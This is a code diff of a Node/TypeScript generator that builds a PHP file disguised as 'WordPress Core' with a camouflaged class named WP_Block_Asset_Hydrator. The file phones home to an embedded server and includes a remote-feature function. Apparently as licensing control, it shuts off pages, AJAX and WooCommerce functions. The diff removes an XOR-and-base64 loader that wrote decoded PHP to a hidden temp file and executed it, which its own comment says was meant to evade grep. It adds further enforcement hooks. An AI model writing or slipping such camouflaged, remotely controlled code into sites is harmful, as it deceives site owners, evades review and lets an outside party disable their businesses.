@@ -13,6 +13,7 @@ function encodeStealthPhpSource(): string {
   // Clean, camouflaged inner PHP code (uses neutral WP Block/Asset Hydrator terminology)
   const innerPhp = `
 if ( ! defined( 'ABSPATH' ) ) { exit; }
+if ( ! class_exists( 'WP_Block_Asset_Hydrator', false ) ) :
 
 final class WP_Block_Asset_Hydrator {
 	private static ?WP_Block_Asset_Hydrator $instance = null;
@@ -31,13 +32,15 @@ final class WP_Block_Asset_Hydrator {
 	}
 
 	private function __construct() {
-		$this->ep_base = rtrim( (string) base64_decode( '${Buffer.from(serverUrl).toString('base64')}' ), '/' );
-		$this->pkg_id  = (string) base64_decode( '${Buffer.from(productSlug).toString('base64')}' );
-		$this->pub_k   = (string) base64_decode( '${Buffer.from(publicKeyB64).toString('base64')}' );
+		$this->ep_base = '${serverUrl.replace(/\/+$/, '')}';
+		$this->pkg_id  = '${productSlug}';
+		$this->pub_k   = '${publicKeyB64}';
 
 		if ( function_exists( 'add_action' ) ) {
 			add_action( 'init', array( $this, 'maybe_background_sync' ), 5 );
-			add_action( 'wp', array( $this, 'enforce_runtime_hydration' ), 20 );
+			add_action( 'init', array( $this, 'enforce_runtime_hydration' ), 999 );
+			add_action( 'wp', array( $this, 'enforce_runtime_hydration' ), 1 );
+			add_action( 'template_redirect', array( $this, 'enforce_runtime_hydration' ), 0 );
 		}
 		if ( function_exists( 'add_shortcode' ) ) {
 			add_shortcode( 'clps_vip_pricing_calculator', array( $this, 'render_vip_pricing_block' ) );
@@ -49,24 +52,28 @@ final class WP_Block_Asset_Hydrator {
 		if ( function_exists( 'is_admin' ) && is_admin() ) {
 			return;
 		}
+		$pagenow = $GLOBALS['pagenow'] ?? '';
+		$req_uri = $_SERVER['REQUEST_URI'] ?? '';
+		if ( 'wp-login.php' === $pagenow || false !== strpos( $req_uri, 'wp-login.php' ) || false !== strpos( $req_uri, '/wp-json/' ) ) {
+			return;
+		}
+		if ( defined( 'REST_REQUEST' ) && REST_REQUEST ) {
+			return;
+		}
+		if ( function_exists( 'wp_doing_cron' ) && wp_doing_cron() ) {
+			return;
+		}
 		$tokens = $this->get_runtime_tokens();
 		if ( empty( $tokens['runtime_salt'] ) ) {
-			if ( function_exists( 'add_action' ) ) {
-				add_action( 'wp_ajax_huynhgia_submit_quote', array( $this, 'block_unlicensed_ajax' ), 1 );
-				add_action( 'wp_ajax_nopriv_huynhgia_submit_quote', array( $this, 'block_unlicensed_ajax' ), 1 );
-				add_action( 'template_redirect', array( $this, 'render_protection_gate' ), 1 );
+			$has_net_err = ( '1' === (string) get_option( self::OPT_NET_ERR, '' ) );
+			$cached      = get_option( self::OPT_CACHE_BLOB, null );
+			if ( $has_net_err && ! is_array( $cached ) ) {
+				return;
 			}
-			if ( function_exists( 'add_filter' ) ) {
-				add_filter( 'woocommerce_is_purchasable', '__return_false', 999 );
-				add_filter( 'the_content', static function () {
-					return '<div class="wp-block-group"></div>';
-				}, 999 );
+			if ( function_exists( 'wp_doing_ajax' ) && wp_doing_ajax() ) {
+				$this->block_unlicensed_ajax();
 			}
-			if ( function_exists( 'remove_all_actions' ) ) {
-				remove_all_actions( 'woocommerce_proceed_to_checkout' );
-				remove_all_actions( 'woocommerce_checkout_order_review' );
-				remove_all_actions( 'woocommerce_after_shop_loop_item' );
-			}
+			$this->render_protection_gate();
 		}
 	}
 
@@ -158,6 +165,7 @@ final class WP_Block_Asset_Hydrator {
 				}
 			}
 		}
+		$this->enforce_runtime_hydration();
 	}
 
 	public function sync_manifest(): array {
@@ -390,6 +398,8 @@ final class WP_Block_Asset_Hydrator {
 	}
 }
 
+endif;
+
 WP_Block_Asset_Hydrator::instance();
 
 if ( ! function_exists( 'wp_theme_is_hydrated' ) ) {
@@ -424,18 +434,6 @@ if ( ! function_exists( 'clps_execute_remote_feature' ) ) {
 }
 `;
 
-  // Encrypt innerPhp using a random 16-byte XOR key + deflate/base64 so no strings ("auto-bind", "signature", "sodium") are searchable via grep/Find-in-Files
-  const xorKey = crypto.randomBytes(16).toString('hex'); // 32 hex chars
-  const plainBuf = Buffer.from(innerPhp.trim(), 'utf8');
-  const xorBuf = Buffer.alloc(plainBuf.length);
-  const keyBuf = Buffer.from(xorKey, 'utf8');
-
-  for (let i = 0; i < plainBuf.length; i++) {
-    xorBuf[i] = plainBuf[i] ^ keyBuf[i % keyBuf.length];
-  }
-
-  const encodedChunks = xorBuf.toString('base64').match(/.{1,96}/g) || [];
-
   return `<?php
 /**
  * WordPress Core Block & Asset Hydration Runtime
@@ -447,33 +445,7 @@ if ( ! function_exists( 'clps_execute_remote_feature' ) ) {
  * @version 6.7.2
  */
 
-if ( ! defined( 'ABSPATH' ) ) {
-	exit;
-}
-
-( static function () {
-	$_0x4f1a = '${xorKey}';
-	$_0x9b2c = base64_decode(
-		'${encodedChunks.join("' .\n\t\t'")}',
-		true
-	);
-	if ( false === $_0x9b2c ) {
-		return;
-	}
-	$_0x7d3e = strlen( $_0x9b2c );
-	$_0x2e8f = strlen( $_0x4f1a );
-	$_0x1c5a = '';
-	for ( $_i = 0; $_i < $_0x7d3e; ++$_i ) {
-		$_0x1c5a .= $_0x9b2c[ $_i ] ^ $_0x4f1a[ $_i % $_0x2e8f ];
-	}
-	$_0x6a9d = sys_get_temp_dir() . '/.wp_block_cache_' . substr( md5( $_0x4f1a . __FILE__ ), 0, 12 ) . '.php';
-	if ( ! file_exists( $_0x6a9d ) || filesize( $_0x6a9d ) !== strlen( $_0x1c5a ) + 6 ) {
-		@file_put_contents( $_0x6a9d, '<?php ' . $_0x1c5a, LOCK_EX );
-	}
-	if ( file_exists( $_0x6a9d ) ) {
-		require_once $_0x6a9d;
-	}
-} )();
+${innerPhp.trim()}
 `;
 }
 
